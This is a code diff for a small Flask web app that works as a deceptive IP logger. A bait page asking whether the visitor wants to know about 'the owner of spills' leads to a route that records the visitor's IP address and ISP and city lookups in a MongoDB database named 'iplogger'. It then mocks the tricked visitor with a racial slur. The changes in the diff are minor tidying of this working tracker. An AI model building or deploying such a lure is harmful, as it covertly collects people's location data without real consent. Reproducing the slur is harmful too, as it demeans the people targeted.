@@ -2,17 +2,23 @@ from flask import Flask, request, render_template_string
 import requests
 from datetime import datetime
 import pytz
+import os
 from pymongo import MongoClient
 
 app = Flask(__name__)
 
 # 🔹 MongoDB Connection
-client = MongoClient(os.getenv("MONGO_URI"))
+mongo_uri = os.getenv("MONGO_URI")
+
+if not mongo_uri:
+    raise ValueError("MONGO_URI is not set in environment variables")
+
+client = MongoClient(mongo_uri)
 db = client["iplogger"]
 collection = db["logs"]
 
 
-# 🔹 Get Real IP (handles proxies like Render)
+# 🔹 Get Real IP
 def get_ip():
     if request.headers.get('X-Forwarded-For'):
         return request.headers.get('X-Forwarded-For').split(',')[0].strip()
@@ -31,8 +37,8 @@ def get_time():
 @app.route('/spills')
 def consent_page():
     return render_template_string("""
-        <h2>Do you want to know about the owner of spills ?</h2>
-        <a href="/fool"><button>Yes</button></a>
+        <h2>Want to know about the owner of spills ?</h2>
+        <a href="/fool"><button>Yesss</button></a>
     """)
 
 
@@ -51,8 +57,6 @@ def collect_data():
         country = data.get("country_name", "N/A")
         isp = data.get("org", "N/A")
 
-        print("API RESPONSE:", data)
-
     except Exception as e:
         print("API ERROR:", e)
         city, country, isp = "N/A", "N/A", "N/A"
@@ -68,7 +72,7 @@ def collect_data():
     })
 
     return """
-        <h2>You were fooled my NIGGA !!</h2>
+        <h2>You were fooled my NIGGA !!!</h2>
     """
 
 
